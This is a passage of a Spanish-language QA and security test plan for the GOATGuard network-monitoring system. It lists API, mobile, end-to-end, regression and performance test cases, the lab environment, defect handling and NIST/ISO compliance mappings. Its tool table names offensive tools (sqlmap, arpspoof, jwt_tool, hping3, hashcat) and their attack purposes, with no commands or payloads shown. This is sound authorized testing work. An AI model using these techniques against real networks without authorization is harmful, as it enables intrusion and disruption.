| **Casos** | 1. Con metricas disponibles → 200 con isp_latency_avg, packet_loss_pct, jitter, dns_response_time_avg, failed_connections_global. 2. Sin metricas → campos vacios/null. 3. Verificar timestamp ISO 8601. |

---

### API-009: GET /api/network/metrics/history

| Campo | Detalle |
|---|---|
| **ID** | API-009 |
| **RF** | RF-040 |
| **Metodo/Ruta** | `GET /api/network/metrics/history` |
| **Casos** | Mismos casos que API-007 pero para metricas de red global. |

---

### API-010: GET /api/network/top-talkers

| Campo | Detalle |
|---|---|
| **ID** | API-010 |
| **RF** | RF-034 |
| **Metodo/Ruta** | `GET /api/network/top-talkers` |
| **Casos** | 1. Sin param → top 10 por defecto. 2. `?limit=5` → top 5. 3. Verificar campos: rank, device_id, hostname, alias, ip, total_consumption, is_hog. 4. `is_hog` true para consumo desproporcionado. |

---

### API-011: GET /api/agents

| Campo | Detalle |
|---|---|
| **ID** | API-011 |
| **RF** | RF-037 |
| **Metodo/Ruta** | `GET /api/agents` |
| **Casos** | 1. Sin filtro → todos los agentes. 2. `?status=active` → solo activos. 3. Sin agentes → `[]`. 4. Verificar campos: id, uid, device_id, hostname, ip, status, last_heartbeat, registered_at. 5. Agente inactivo (sin heartbeat reciente) → status "inactive". |

---

### API-012: GET /api/alerts

| Campo | Detalle |
|---|---|
| **ID** | API-012 |
| **RF** | RF-036 |
| **Metodo/Ruta** | `GET /api/alerts` |
| **Casos** | 1. Sin filtros → todas, ordenadas por fecha desc. 2. `?severity=critical` → solo criticas. 3. `?seen=false` → solo no vistas. 4. `?device_id=1` → alertas del dispositivo 1. 5. Paginacion: `?limit=5&offset=0` → primeras 5. 6. Verificar campos: id, device_id, hostname, anomaly_type, description, severity, seen, timestamp. 7. Verificar total count. |

---

### API-013: PATCH /api/alerts/{id}/seen

| Campo | Detalle |
|---|---|
| **ID** | API-013 |
| **RF** | RF-050 |
| **Metodo/Ruta** | `PATCH /api/alerts/{id}/seen` |
| **Casos** | 1. Alerta existente y no vista → 200 con seen=true, seen_at. 2. Alerta ya vista → idempotente (no error). 3. ID inexistente → 404. 4. Verificar que no se puede revertir. |

---

### API-014: POST /api/push/register

| Campo | Detalle |
|---|---|
| **ID** | API-014 |
| **RF** | RF-054 |
| **Metodo/Ruta** | `POST /api/push/register` |
| **Casos** | 1. Token FCM valido + platform=android → 201. 2. Token faltante → 400. 3. Token duplicado → actualizacion (no duplicar). 4. Platform invalida → 400. 5. Verificar almacenamiento en tabla PUSH_TOKEN. |

---

### API-015: DELETE /api/push/register

| Campo | Detalle |
|---|---|
| **ID** | API-015 |
| **RF** | RF-054 |
| **Metodo/Ruta** | `DELETE /api/push/register` |
| **Casos** | 1. Token existente → 200 deleted=true. 2. Token inexistente → 404. 3. Verificar eliminacion efectiva en BD. |

---

## 14. Casos de Prueba Funcionales - App Movil (MOB)

> **Prioridad: ALTA** | RF-041 a RF-054

### MOB-001: Pantalla de login

| Campo | Detalle |
|---|---|
| **ID** | MOB-001 |
| **RF** | RF-041 |
| **Pasos** | 1. Abrir app → mostrar pantalla de login. 2. Ingresar credenciales validas → navegar a dashboard. 3. Credenciales invalidas → mostrar error. 4. Sin conexion → mostrar mensaje de conectividad. 5. Campos vacios → validacion local antes de enviar. |

---

### MOB-002: Persistencia y cierre de sesion

| Campo | Detalle |
|---|---|
| **ID** | MOB-002 |
| **RF** | RF-042, RF-043 |
| **Pasos** | 1. Login exitoso → cerrar app → reabrir → debe ir directo al dashboard. 2. Token expirado → debe redirigir a login. 3. Boton logout → limpiar token → mostrar login. 4. Post-logout, back button no debe volver al dashboard. |

---

### MOB-003: Dashboard general de la red

| Campo | Detalle |
|---|---|
| **ID** | MOB-003 |
| **RF** | RF-044 |
| **Pasos** | 1. Verificar visualizacion de: ISP Health, packet loss, jitter, DNS RT, failed connections. 2. Verificar actualizacion periodica. 3. Sin conexion API → mostrar ultimos datos con indicador de desactualizacion. 4. Sin metricas → mensaje informativo. |

---

### MOB-004: Listado y detalle de dispositivos

| Campo | Detalle |
|---|---|
| **ID** | MOB-004 |
| **RF** | RF-045, RF-046 |
| **Pasos** | 1. Ver lista de dispositivos con nombre/alias, IP, estado. 2. Verificar diferenciacion visual con/sin agente. 3. Tap en dispositivo → ver detalle con metricas. 4. Dispositivo sin agente → solo info basica. 5. Inventario vacio → mensaje. |

---

### MOB-005: Edicion de alias

| Campo | Detalle |
|---|---|
| **ID** | MOB-005 |
| **RF** | RF-047 |
| **Pasos** | 1. Desde detalle de dispositivo, editar alias. 2. Guardar → verificar actualizacion en interfaz. 3. Error de red → mostrar error y conservar alias anterior. 4. Alias >64 chars → validacion local. |

---

### MOB-006: Alertas y notificaciones push

| Campo | Detalle |
|---|---|
| **ID** | MOB-006 |
| **RF** | RF-049, RF-050, RF-053, RF-054 |
| **Pasos** | 1. Ver listado de alertas ordenado cronologicamente. 2. Verificar tipo, dispositivo, timestamp por alerta. 3. Marcar alerta como vista → actualizar badge. 4. Generar alerta en backend → verificar push recibido (app en foreground, background, cerrada). 5. Denegar permisos de notificacion → app funciona, alertas solo in-app. 6. Verificar registro de token push en backend tras login. 7. Verificar eliminacion de token tras logout. |

---

### MOB-007: Visualizacion de metricas historicas

| Campo | Detalle |
|---|---|
| **ID** | MOB-007 |
| **RF** | RF-052 |
| **Pasos** | 1. Seleccionar rango de tiempo. 2. Verificar graficas de evolucion de metricas. 3. Rango sin datos → mensaje informativo. 4. Rango amplio → verificar que la resolucion se ajusta automaticamente. |

---

### MOB-008: Estado de agentes e indicadores visuales

| Campo | Detalle |
|---|---|
| **ID** | MOB-008 |
| **RF** | RF-051 |
| **Pasos** | 1. Ver indicador verde para agentes activos. 2. Ver indicador rojo para agentes inactivos. 3. Actualizacion periodica del estado. 4. Sin agentes registrados → no mostrar seccion. |

---

### MOB-009: Contextualizacion de segmento de red

| Campo | Detalle |
|---|---|
| **ID** | MOB-009 |
| **RF** | RF-048 |
| **Pasos** | 1. Verificar dispositivos organizados por segmento de red. 2. Con un solo segmento → todos en un grupo. 3. Verificar informacion de red asociada a cada dispositivo. |

---

### MOB-010: Rendimiento en dispositivos gama baja

| Campo | Detalle |
|---|---|
| **ID** | MOB-010 |
| **RF** | RC03 |
| **Pasos** | 1. Ejecutar app en emulador con 2GB RAM. 2. Navegar por dashboard con 50+ dispositivos. 3. Verificar scroll fluido (>30 FPS). 4. Verificar paginacion en listas largas. 5. Verificar que no hay OOM crashes. |

---

### MOB-011: Compatibilidad Android

| Campo | Detalle |
|---|---|
| **ID** | MOB-011 |
| **RF** | RNF Portabilidad |
| **Pasos** | 1. Ejecutar en Android 10, 11, 12, 13, 14. 2. Verificar UI responsive en pantallas de 5" a 7". 3. Verificar comportamiento con modo oscuro. 4. Verificar con diferentes densidades de pantalla (mdpi, hdpi, xhdpi, xxhdpi). |

---

## 15. Casos de Prueba End-to-End (E2E)

> **Prioridad: ALTA** | Validacion del pipeline completo agente → colector → motor → BD → API → app

### E2E-001: Pipeline completo de captura a visualizacion

| Campo | Detalle |
|---|---|
| **ID** | E2E-001 |
| **Titulo** | Verificar flujo completo: trafico de red → captura → analisis → visualizacion en app |
| **Prioridad** | Alta |
| **RF Asociados** | RF-001 → RF-018 → RF-032 → RF-044 |
| **Precondiciones** | - Stack completo desplegado: agentes + colector + motor + BD + API + app. - Red de pruebas con trafico controlado |
| **Pasos** | 1. Generar trafico conocido en la red (ping, HTTP, DNS). 2. Verificar que el agente captura y transmite al colector. 3. Verificar rotacion de PCAP y procesamiento por el motor. 4. Verificar que metricas se insertan en BD (consulta directa a PostgreSQL). 5. Verificar que la API retorna las metricas actualizadas. 6. Verificar que la app muestra las metricas en el dashboard. 7. Medir latencia total: generacion de trafico → visualizacion en app (target: <2 minutos). |
| **Resultado Esperado** | Datos fluyen desde el trafico de red hasta la app sin perdida. Latencia total <2 minutos (1 ciclo de rotacion + procesamiento + consulta). |
| **Criterio de Aceptacion** | 100% de metricas del trafico generado visibles en la app. Sin perdida de datos en ningun punto del pipeline. |

---

### E2E-002: Flujo completo de generacion y recepcion de alertas

| Campo | Detalle |
|---|---|
| **ID** | E2E-002 |
| **Titulo** | Verificar flujo: anomalia → deteccion → alerta en BD → push → visualizacion en app |
| **Prioridad** | Alta |
| **RF Asociados** | RF-029, RF-036, RF-039, RF-049, RF-050, RF-053 |
| **Pasos** | 1. Simular ping sweep desde un endpoint. 2. Verificar que el motor detecta la anomalia y genera alerta en BD. 3. Verificar que se envia push notification al dispositivo registrado. 4. Verificar que la app recibe la notificacion (foreground y background). 5. Abrir la app → verificar alerta en listado con badge de no vista. 6. Marcar como vista → verificar que el badge se actualiza. 7. Medir latencia: inicio de anomalia → recepcion de push (target: <3 minutos). |
| **Resultado Esperado** | Alerta detectada, persistida, notificada y visualizada correctamente. Latencia <3 minutos. |
| **Criterio de Aceptacion** | Flujo completo sin intervencion manual. Push recibido en <3 minutos. |

---

### E2E-003: Flujo de descubrimiento de nuevo dispositivo

| Campo | Detalle |
|---|---|
| **ID** | E2E-003 |
| **Titulo** | Verificar flujo: nuevo dispositivo en red → descubrimiento ARP → inventario → alerta → visualizacion |
| **Prioridad** | Alta |
| **RF Asociados** | RF-008, RF-028, RF-029, RF-045 |
| **Pasos** | 1. Con el sistema operando, conectar un dispositivo nuevo a la red. 2. Esperar ciclo de ARP scan del agente. 3. Verificar que el agente reporta el nuevo dispositivo al colector. 4. Verificar que el motor actualiza el inventario en BD. 5. Verificar generacion de alerta tipo "New Device". 6. Verificar que la app muestra el nuevo dispositivo en el listado. 7. Editar alias del nuevo dispositivo desde la app. 8. Desconectar el dispositivo → verificar cambio de estado a "desconectado" en la app. |
| **Resultado Esperado** | Nuevo dispositivo detectado, inventariado, alertado y visible en la app en <2 ciclos de ARP scan. |
| **Criterio de Aceptacion** | Deteccion automatica. Alerta generada. Dispositivo visible en app. Estado actualizado al desconectar. |

---

## 16. Casos de Prueba de Regresion (REG)

> **Prioridad: MEDIA** | Ejecutar despues de cada fix de bugs o cambio significativo

### REG-001: Regresion de seguridad post-fix

| Campo | Detalle |
|---|---|
| **ID** | REG-001 |
| **Titulo** | Re-ejecutar suite de seguridad tras correcciones de vulnerabilidades |
| **Prioridad** | Media |
| **Casos a re-ejecutar** | PEN-001 a PEN-013, INJ-001 a INJ-008, SEC-001 a SEC-009 |
| **Trigger** | Cualquier fix en modulos de autenticacion, validacion de entrada, o comunicacion TLS |
| **Criterio de Aceptacion** | 100% de casos de seguridad pasan. Ningun fix introduce nuevas vulnerabilidades. |

---

### REG-002: Regresion funcional de API post-refactor

| Campo | Detalle |
|---|---|
| **ID** | REG-002 |
| **Titulo** | Re-ejecutar suite de API tras cambios en endpoints o modelos |
| **Prioridad** | Media |
| **Casos a re-ejecutar** | API-001 a API-015 |
| **Trigger** | Cualquier cambio en rutas, modelos Pydantic, queries SQLAlchemy, o middleware |
| **Criterio de Aceptacion** | 100% de contratos de API se mantienen. Sin breaking changes no documentados. |

---

### REG-003: Regresion de pipeline de datos post-cambio en motor

| Campo | Detalle |
|---|---|
| **ID** | REG-003 |
| **Titulo** | Re-ejecutar suite de backend/motor tras cambios en procesamiento PCAP |
| **Prioridad** | Media |
| **Casos a re-ejecutar** | BKD-001 a BKD-018, E2E-001 |
| **Trigger** | Cambios en el motor de analisis, parser PCAP, o logica de metricas |
| **Criterio de Aceptacion** | Todas las metricas mantienen precision <10% desviacion. Pipeline E2E funcional. |

---

### REG-004: Regresion de app movil post-actualizacion de dependencias

| Campo | Detalle |
|---|---|
| **ID** | REG-004 |
| **Titulo** | Re-ejecutar suite movil tras actualizacion de Flutter o dependencias |
| **Prioridad** | Media |
| **Casos a re-ejecutar** | MOB-001 a MOB-011, INJ-008 |
| **Trigger** | Actualizacion de Flutter SDK, dependencias en pubspec.yaml, o cambios en UI |
| **Criterio de Aceptacion** | Todas las pantallas funcionales. Sin regresiones de UI. Dependencias sin CVEs. |

---

## 17. Casos de Prueba No Funcionales (NFR)

### NFR-001: Tiempo de respuesta de API - Consultas simples

| Campo | Detalle |
|---|---|
| **ID** | NFR-001 |
| **Requisito** | RNF Rendimiento: <2s para consultas simples |
| **Endpoints** | GET /api/devices, GET /api/network/metrics, GET /api/alerts, GET /api/agents |
| **Metodo** | 100 peticiones consecutivas, medir p50, p95, p99 |
| **Criterio** | p95 < 2000ms |

---

### NFR-002: Tiempo de respuesta de API - Consultas historicas

| Campo | Detalle |
|---|---|
| **ID** | NFR-002 |
| **Requisito** | RNF Rendimiento: <5s para consultas historicas |
| **Endpoints** | GET /api/devices/{id}/metrics/history, GET /api/network/metrics/history |
| **Metodo** | 50 peticiones con rango de 30 dias, medir p50, p95, p99 |
| **Criterio** | p95 < 5000ms |

---

### NFR-003: Disponibilidad del colector 24/7

| Campo | Detalle |
|---|---|
| **ID** | NFR-003 |
| **Requisito** | RNF Disponibilidad: 7 dias consecutivos sin caidas |
| **Metodo** | Monitoreo continuo con health check cada 30s durante 7 dias |
| **Criterio** | Uptime >99.9%. Cero OOM kills. Cero crashes no controlados. |

---

### NFR-004: Disponibilidad de la API

| Campo | Detalle |
|---|---|
| **ID** | NFR-004 |
| **Requisito** | RNF Disponibilidad: 99% de peticiones respondidas correctamente |
| **Metodo** | 10,000 peticiones durante periodo de 24h, calcular tasa de exito |
| **Criterio** | >9,900 respuestas exitosas (2xx). <100 errores (5xx). |

---

### NFR-005: Transaccionalidad de inserciones en BD

| Campo | Detalle |
|---|---|
| **ID** | NFR-005 |
| **Requisito** | RNF Fiabilidad: inserciones atomicas |
| **Metodo** | 1. Iniciar insercion de un lote de metricas. 2. Simular fallo a mitad de la transaccion (kill proceso, fallo de red). 3. Verificar que la insercion parcial se revirtio completamente. 4. Verificar consistencia de datos post-fallo. |
| **Criterio** | 0 registros parciales tras fallo. Rollback completo verificado en BD. |

---

### NFR-006: Documentacion de API

| Campo | Detalle |
|---|---|
| **ID** | NFR-006 |
| **Requisito** | RNF Mantenibilidad: todos los endpoints documentados |
| **Metodo** | 1. Verificar que FastAPI genera OpenAPI spec automaticamente. 2. Comparar spec con los 15 endpoints del CSV de API. 3. Verificar que cada endpoint tiene: metodo, ruta, parametros, respuestas, codigos de error. |
| **Criterio** | 100% de endpoints documentados en OpenAPI. Consistencia total con CSV de API. |

---

### NFR-007: Pipeline CI/CD funcional

| Campo | Detalle |
|---|---|
| **ID** | NFR-007 |
| **Requisito** | RNF Mantenibilidad: despliegue via CI/CD |
| **Metodo** | 1. Push a rama develop → verificar trigger de pipeline. 2. Verificar fases: build, lint, test, deploy. 3. Merge a main → verificar deploy a produccion. 4. Verificar build de APK en pipeline Flutter. 5. Verificar que el pipeline incluye `pip-audit` / `safety` (INJ-007). |
| **Criterio** | Pipeline ejecuta todas las fases. Fallo en tests bloquea deploy. Build de APK exitoso. |

---

## 18. Entorno de Pruebas

| Componente | Especificacion |
|---|---|
| **Red de pruebas** | LAN aislada 192.168.1.0/24, switch gestionable, 3-10 endpoints |
| **Servidor backend** | Ubuntu 22.04 LTS, 8GB RAM, 4 vCPU, 100GB SSD (particion separada para PCAP) |
| **Base de datos** | PostgreSQL 15+, misma maquina o red local |
| **Agentes** | Python 3.10+, Windows 10/11, Ubuntu 22.04, Debian 12 |
| **Dispositivos moviles** | Android 10-14, fisico (Samsung Galaxy A serie) + emulador (Pixel 4a, 2GB RAM) |
| **Herramientas de seguridad** | Maquina Kali Linux 2024+ con Burp Suite Pro, sqlmap, Nmap, Ettercap, MobSF |
| **CI/CD** | GitHub Actions o equivalente con acceso a registry de Docker |

---

## 19. Roles y Responsabilidades

| Rol | Responsabilidades | Perfil Requerido |
|---|---|---|
| **Lead QA / Test Manager** | Planificacion, seguimiento, reporte de metricas, decision de go/no-go | 3+ anos en QA, experiencia en testing de seguridad |
| **QA Engineer - Seguridad** | Ejecucion de PEN, INJ, SEC, DAT. Uso de herramientas ofensivas | Certificacion CEH/OSCP o experiencia equivalente |
| **QA Engineer - Funcional** | Ejecucion de AGT, BKD, API, MOB, E2E. Automatizacion con Postman/k6 | 2+ anos en QA, experiencia con APIs REST |
| **QA Engineer - Rendimiento** | Ejecucion de NET, NFR. Configuracion de herramientas de carga | Experiencia con k6/Locust/JMeter y monitoreo de infraestructura |
| **DevOps** | Provision de entornos, configuracion de red aislada, CI/CD | Experiencia con Docker, redes, Linux |

---

## 20. Metricas de Pruebas

| Metrica | Formula | Objetivo |
|---|---|---|
| **Cobertura de RF** | (RFs cubiertos por al menos 1 caso / Total RFs) x 100 | >= 100% |
| **Tasa de ejecucion** | (Casos ejecutados / Total casos planificados) x 100 | >= 95% |
| **Tasa de exito** | (Casos pasados / Casos ejecutados) x 100 | >= 90% |
| **Densidad de defectos** | Defectos encontrados / KLOC del modulo | Referencia, sin umbral fijo |
| **Defectos criticos abiertos** | Conteo de bugs criticos/altos sin resolver | 0 para go-live |
| **Cobertura OWASP** | (Categorias OWASP cubiertas / 10) x 100 | 100% (10/10) |
| **Tiempo medio de deteccion** | Tiempo desde inyeccion de defecto hasta deteccion | < 1 ciclo de sprint |
| **Efectividad de regresion** | Defectos recurrentes / Total defectos corregidos | < 5% |

---

## 21. Gestion de Defectos

### 21.1 Clasificacion de Severidad

| Severidad | Descripcion | SLA de Correccion |
|---|---|---|
| **Critica** | Vulnerabilidad explotable remotamente, perdida de datos, crash del sistema | 24 horas |
| **Alta** | Falla de seguridad que requiere condiciones especificas, funcionalidad core rota | 72 horas |
| **Media** | Defecto funcional con workaround, problema de rendimiento no critico | 1 sprint |
| **Baja** | Defecto cosmetico, mejora menor, documentacion | Backlog |

### 21.2 Flujo de Gestion

1. **Deteccion**: QA documenta defecto con evidencia (screenshot, logs, pasos de reproduccion)
2. **Clasificacion**: Lead QA asigna severidad y prioridad
3. **Asignacion**: Se asigna al desarrollador responsable del modulo
4. **Correccion**: Desarrollador aplica fix y crea PR con referencia al defecto
5. **Verificacion**: QA re-ejecuta caso de prueba original + suite de regresion (REG)
6. **Cierre**: Si pasa verificacion, se cierra. Si no, se reabre con nueva evidencia

### 21.3 Criterios de Bloqueo (Stop Testing)

- Defecto critico de seguridad encontrado → se detienen todas las pruebas funcionales hasta que se resuelva
- Entorno de pruebas inestable → se detienen pruebas hasta restauracion
- 3+ defectos criticos abiertos simultaneamente → escalacion a lider de proyecto

---

## 22. Criterios de Entrada y Salida

### Criterios de Entrada (para iniciar la ejecucion)

| # | Criterio | Verificacion |
|---|---|---|
| 1 | Entorno de pruebas desplegado (backend + BD + agentes) | Checklist de infraestructura |
| 2 | Red de pruebas aislada (192.168.1.0/24) disponible | Verificacion de conectividad |
| 3 | APK de pruebas instalada en dispositivo/emulador | Verificacion de instalacion |
| 4 | Herramientas de seguridad instaladas y configuradas | Checklist de herramientas |
| 5 | Datos de prueba cargados (usuarios, dispositivos, metricas historicas) | Script de seed ejecutado |
| 6 | Documentacion de API (OpenAPI spec) disponible | URL de documentacion accesible |

### Criterios de Salida (para considerar las pruebas completas)

| # | Criterio | Umbral |
|---|---|---|
| 1 | Todos los casos de prueba PEN ejecutados | 100% ejecutados |
| 2 | Cero defectos criticos de seguridad abiertos | 0 criticos sin resolver |
| 3 | Cero defectos de inyeccion confirmados | 0 inyecciones exitosas |
| 4 | Tests de estres superados con metricas dentro de umbrales | 100% dentro de RNF |
| 5 | Cobertura funcional de API | 100% de los 15 endpoints verificados |
| 6 | Cobertura funcional de app movil | >90% de RF-041 a RF-054 verificados |
| 7 | Tests de regresion post-fix pasando | 100% green |

---

## 23. Herramientas Requeridas

| Categoria | Herramienta | Proposito |
|---|---|---|
| **Penetracion** | Burp Suite Professional | Proxy MitM, escaneo web, fuzzing |
| **Penetracion** | sqlmap | Deteccion automatizada de SQLi |
| **Penetracion** | Nmap | Escaneo de puertos y servicios |
| **Penetracion** | Ettercap / arpspoof | ARP spoofing para tests MitM en LAN |
| **Penetracion** | Frida + Objection | Analisis dinamico de app movil |
| **Penetracion** | MobSF | Analisis estatico/dinamico de APK |
| **Penetracion** | jwt_tool | Manipulacion y ataque de JWT |
| **Estres** | k6 / Locust | Pruebas de carga de API |
| **Estres** | hping3 | Flooding UDP/TCP |
| **Estres** | iperf3 | Medicion de rendimiento de red |
| **Estres** | tc (traffic control) | Simulacion de condiciones de red |
| **Funcional** | Postman / Insomnia | Pruebas manuales de API |
| **Funcional** | Flutter integration_test | Pruebas E2E de app movil |
| **Seguridad** | Wireshark / tshark | Analisis de trafico y verificacion TLS |
| **Seguridad** | pip-audit + safety | Auditoria de dependencias Python |
| **Seguridad** | Snyk | Auditoria de dependencias Flutter/Python |
| **Monitoreo** | htop / Prometheus | Monitoreo de recursos del servidor durante pruebas |
| **Seguridad** | OWASP ZAP | Escaneo automatizado DAST |
| **Seguridad** | Nuclei | Templates de CVE para frameworks especificos |
| **Seguridad** | testssl.sh / sslscan | Verificacion de configuracion TLS |
| **Seguridad** | hashcat | Verificacion de fortaleza de hashing |
| **Movil** | Android Studio Emulator | Emulacion de dispositivos gama baja |
| **Movil** | adb + Frida + objection | Analisis dinamico de app Android |

---

## 24. Mapeo de Cumplimiento NIST SP 800-115 / ISO 27001

### 24.1 NIST SP 800-115 - Technical Guide to Information Security Testing

| Fase NIST | Actividades en GOATGuard | Casos de Prueba |
|---|---|---|
| **Planning** | Definicion de alcance, estrategia, roles | Seccion 1 (Estrategia), Seccion 19 (Roles) |
| **Discovery** | Escaneo de puertos, enumeracion de servicios, reconocimiento | PEN-009, PEN-012 |
| **Attack** | Explotacion de vulnerabilidades identificadas | PEN-001 a PEN-008, PEN-011, PEN-013, INJ-001 a INJ-006 |
| **Reporting** | Documentacion de hallazgos, clasificacion, remediacion | Seccion 21 (Gestion de Defectos), Seccion 20 (Metricas) |

### 24.2 ISO 27001:2022 - Controles Relevantes

| Control ISO | Descripcion | Casos de Prueba | Estado |
|---|---|---|---|
| A.5.15 | Control de acceso | SEC-001, SEC-003, SEC-009, PEN-006, PEN-007, PEN-008 | Cubierto |
| A.5.17 | Informacion de autenticacion | SEC-002, PEN-004, DAT-001, DAT-007 | Cubierto |
| A.5.23 | Seguridad en servicios cloud | PEN-011 (SSRF metadata) | Cubierto |
| A.5.33 | Proteccion de registros | SEC-005 (logs de auditoria) | Cubierto |
| A.8.5 | Autenticacion segura | SEC-001, SEC-002, PEN-006, SEC-008 | Cubierto |
| A.8.9 | Gestion de configuracion | SEC-004, SEC-006, PEN-009 | Cubierto |
| A.8.12 | Prevencion de fuga de datos | DAT-001 a DAT-007 | Cubierto |
| A.8.24 | Uso de criptografia | PEN-001, PEN-013, DAT-003, DAT-006 | Cubierto |
| A.8.25 | Desarrollo seguro | INJ-007, INJ-008, NFR-007 | Cubierto |
| A.8.28 | Codificacion segura | INJ-001 a INJ-006 (inyeccion) | Cubierto |

### 24.3 NIST Cybersecurity Framework (CSF) 2.0

| Funcion | Categoria | Casos de Prueba |
|---|---|---|
| **Identify** | Asset Management | BKD-005, AGT-006, E2E-003 |
| **Protect** | Access Control | SEC-001 a SEC-009, PEN-006 a PEN-008 |
| **Protect** | Data Security | DAT-001 a DAT-007, PEN-001, PEN-013 |
| **Detect** | Anomalies & Events | BKD-006, E2E-002 |
| **Detect** | Continuous Monitoring | NFR-003, NFR-004 |
| **Respond** | Incident Response | BKD-008, BKD-017, MOB-006 |
| **Recover** | Recovery Planning | NET-003, BKD-018, NET-007 |

---

## 25. Resumen Ejecutivo de Casos de Prueba

| Categoria | Cantidad | Prioridad Predominante |
|---|---|---|
| Penetracion (PEN) | 13 | Critica |
| Inyeccion (INJ) | 8 | Critica/Alta |
| Estres de Red (NET) | 7 | Alta |
| Seguridad Auth/Authz (SEC) | 9 | Alta |
| Proteccion de Datos (DAT) | 7 | Alta |
| Funcionales - Agente (AGT) | 10 | Alta |
| Funcionales - Backend (BKD) | 18 | Alta |
| Funcionales - API (API) | 15 | Alta |
| Funcionales - App Movil (MOB) | 11 | Alta |
| End-to-End (E2E) | 3 | Alta |
| Regresion (REG) | 4 | Media |
| No Funcionales (NFR) | 7 | Alta |
| **TOTAL** | **112** | |

### Cobertura Alcanzada

| Dimension | Metrica | Valor |
|---|---|---|
| Requisitos Funcionales | RF cubiertos / RF totales | 54/54 (100%) |
| OWASP Top 10 (2021) | Categorias cubiertas | 10/10 (100%) |
| Riesgos (CSV) | Riesgos cubiertos por al menos 1 caso | 100% |
| Endpoints API | Endpoints verificados | 15/15 (100%) |
| ISO 27001 controles relevantes | Controles mapeados | 10/10 (100%) |
| NIST CSF funciones | Funciones cubiertas | 5/5 (100%) |

---

> **Nota**: Este documento debe ser revisado y actualizado al finalizar cada sprint. Los casos de prueba de penetracion deben ejecutarse en un entorno aislado y con autorizacion explicita del equipo. Los hallazgos de seguridad deben reportarse de inmediato al lider del proyecto siguiendo el protocolo de divulgacion responsable.

> **Control de versiones del documento**:
> - v1.0 (2026-03-01): Documento inicial con 83 casos de prueba
> - v2.0 (2026-03-01): Refinamiento con analisis QA (IEEE 829) y SecOps (OWASP/NIST/ISO). Agregados: 29 nuevos casos, matrices de trazabilidad, secciones IEEE 829, mapeo de cumplimiento normativo. Total: 112 casos.
